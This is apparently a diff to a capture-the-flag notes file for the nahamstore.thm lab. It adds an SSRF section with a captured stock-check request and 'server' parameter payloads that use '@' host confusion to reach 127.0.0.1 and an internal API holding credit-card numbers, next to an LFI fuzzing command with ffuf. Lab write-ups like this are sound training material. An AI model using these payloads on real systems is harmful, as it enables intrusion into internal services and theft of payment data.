@@ -176,3 +176,39 @@ In ....// if filter remove ../ another ../ is still hanging on, so we can bypass
 LFI fuzzing with ffuf
 ---------------------
 ffuf -u http://nahamstore.thm/product/picture/?file=FUZZ -w LFI-Jhaddix.txt -fs 19
+_______________________________________________________________________________________________________________________________
+SSRF injection (mostly in redirect parameter)
+--------------
+
+When you click check stock button, it redirects to stock.nahamstore.thm
+
+POST /stockcheck HTTP/1.1
+Host: nahamstore.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 62
+Origin: http://nahamstore.thm
+Connection: close
+Referer: http://nahamstore.thm/product?id=2
+Cookie: token=ae67e2fc3f7e9c1a58c518cdd6338b37; session=db46696004bf35c894821e40fbd669fb
+
+product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm#
+
+
+We just want to do internal ssrf injection;
+
+product_id=2&server=stock.nahamstore.thm@127.0.0.1#  (it redirects to the home page)
+
+
+product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm# (it redirects to stock.nahamstore.thm)
+
+product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm/product# (it shows every stocks in that domain)
+
+But we have to find Credit-card number in api, so we have to know subdomains of api.
+------------------------------------------------------------------------------------
+
+product_id=2&server=stock.nahamstore.thm@internal.api.nahamstore.thm#
